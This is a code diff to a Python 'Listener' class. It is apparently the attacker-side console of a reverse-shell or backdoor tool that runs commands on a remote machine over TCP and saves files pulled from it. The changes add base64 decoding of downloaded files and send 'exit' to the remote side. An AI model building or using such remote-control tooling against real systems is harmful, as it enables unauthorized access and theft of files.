@@ -1,4 +1,5 @@
 #!usr/bin/env python3
+import base64
 import socket
 import sys
 import json
@@ -9,7 +10,6 @@ class Listener:
     attackers machine through TCP socket.
     params: ip(str), port(int)
     '''
-    
     def __init__(self, ip:str, port:int) -> None:    
         self.ip = ip 
         self.port = port
@@ -55,7 +55,6 @@ class Listener:
         execute command on the remote machine.
         '''
         self.serial_send(command)
-
         return self.serial_receive()
 
 
@@ -65,12 +64,15 @@ class Listener:
         to the specified path file.
         '''
         with open(path, 'wb') as file:
-            bytes_content = content.encode('utf-8')
+            bytes_content = base64.b64decode(content)
             file.write(bytes_content)
             return (f'[*] File {path} Downloaded successfully.')
 
 
     def run(self):
+        '''
+        start listener.
+        '''
         while True:
             try:
                 command = input('>> ')
@@ -83,6 +85,7 @@ class Listener:
                     path = command_lst[1]
                 
                 if cmd == 'exit':
+                    self.execute_remotely('exit')
                     self.connection.close()
                     sys.exit()
 
